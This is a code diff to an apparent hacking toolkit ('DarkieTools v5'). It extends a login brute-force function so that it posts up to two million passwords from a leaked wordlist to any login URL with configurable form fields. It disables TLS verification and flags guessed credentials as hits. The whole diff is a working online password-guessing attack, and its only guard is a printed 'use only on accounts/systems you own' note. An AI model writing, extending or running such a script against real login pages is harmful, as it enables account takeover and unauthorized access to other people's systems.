@@ -1020,19 +1020,60 @@ def pentest_login_bruteforce():
     if not url:
         return
     user = _get("Username", "admin")
-    wordlist = ["password", "123456", "admin", "admin123", "password123", "root", "letmein",
-                "welcome", "test", "changeme", "12345678", "qwerty"]
-    print(f"  {c(f'Testing {len(wordlist)} passwords against {url}...', CYAN)}")
-    print(f"  {c('Note: use only on accounts you own.', YELLOW)}")
-    for i, pwd in enumerate(wordlist):
+    field_u = _get("Username field name (POST key)", "username")
+    field_p = _get("Password field name (POST key)", "password")
+    fail_marker = _get("Failure keyword in response (e.g. incorrect)", "incorrect").lower()
+
+    # Use the real 14M leaked wordlist if available, else fall back to built-ins.
+    wl = None
+    try:
+        wl = _pick_wordlist()
+    except Exception:
+        wl = None
+    if wl:
+        print(f"  {c(f'Loading wordlist {os.path.basename(wl)} ...', CYAN)}")
+        words = []
         try:
-            r = requests.post(url, data={"username": user, "password": pwd}, timeout=8,
+            with open(wl, "r", encoding="latin-1", errors="ignore") as f:
+                # stream-pop so we don't hold 14M in memory forever
+                for i, line in enumerate(f):
+                    w = line.strip()
+                    if w and len(words) < 2000000:
+                        words.append(w)
+                    if len(words) >= 2000000:
+                        break
+        except Exception as e:
+            print(f"  {RED}{SYM_X} Error reading wordlist: {e}{RESET}")
+            words = []
+    else:
+        words = ["password", "123456", "admin", "admin123", "password123", "root", "letmein",
+                 "welcome", "test", "changeme", "12345678", "qwerty", "kali", "darkie",
+                 "1234krish", "krish1234", "toor", "123admin", "password1"]
+
+    print(f"  {c(f'Testing {len(words)} passwords against {url}...', CYAN)}")
+    print(f"  {c('Note: use only on accounts/systems you own.', YELLOW)}")
+    found = False
+    for i, pwd in enumerate(words, start=1):
+        try:
+            r = requests.post(url, data={field_u: user, field_p: pwd}, timeout=8,
                               headers={"User-Agent": "DarkieTools v5"}, verify=False)
-            ok = "incorrect" not in (r.text or "").lower() and r.status_code == 200 and len(r.text or "") > 100
-            print(f"  {c(f'[{i+1}/{len(wordlist)}]', CYAN)} {user}:{pwd} -> {r.status_code}")
+            body = (r.text or "").lower()
+            cracked = r.status_code == 200 and fail_marker and fail_marker not in body and len(body) > 100
+            status = "HIT" if cracked else "x"
+            print(f"  [{i}] {user}:{pwd} -> {r.status_code} {status if cracked else ''}".rstrip())
+            if cracked:
+                print(f"\n  {RED}{SYM_WARN} POSSIBLE CREDENTIAL: {c(f'{user}:{pwd}', RED)}{RESET}")
+                print(f"  {YELLOW}Verify manually — this is a candidate, not confirmed.{RESET}")
+                add_log_alert("HIGH", "Login", f"Candidate {user}:{pwd}")
+                found = True
+                break
         except Exception:
             pass
-        time.sleep(0.4)
+        if i % 200 == 0:
+            print(f"  {DIM}{i}/{len(words)} tried...{RESET}")
+        time.sleep(0.3)
+    if not found:
+        print(f"  {GREEN}{SYM_CHECK} No candidate found (fed {len(words)} passwords).{RESET}")
     print()
 
 
